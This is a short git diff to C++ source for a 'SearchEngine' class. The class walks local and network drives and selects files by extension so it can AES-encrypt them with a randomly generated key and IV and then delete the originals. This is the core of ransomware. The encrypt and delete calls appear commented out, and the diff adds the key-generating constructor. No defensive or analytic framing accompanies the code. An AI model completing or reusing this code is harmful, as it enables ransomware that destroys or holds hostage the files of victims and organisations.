@@ -50,7 +50,7 @@ VOID SearchEngine::FindFile(String dir)
                 !(FindData.dwFileAttributes & FILE_ATTRIBUTE_READONLY))
                 if (Utils::Contains(ext, Utils::GetFileExt(Path)))
                 {
-                    //Encrypt(key, iv, Path);
+                    //Utils::Encrypt(key, iv, Path);
                     //DeleteFile(Path.c_str());
                 }
 
@@ -83,4 +83,12 @@ VOID SearchEngine::Start()
                 GetDriveType(drive.c_str()) == DRIVE_REMOTE ||
                 GetDriveType(drive.c_str()) == DRIVE_NO_ROOT_DIR)
                 FindFile(drive);
+}
+
+SearchEngine::SearchEngine() : 
+    key{ CryptoPP::AES::DEFAULT_KEYLENGTH }, 
+    iv{ CryptoPP::AES::BLOCKSIZE }
+{
+    prng.GenerateBlock(key, key.size());
+    prng.GenerateBlock(iv, iv.size());
 }
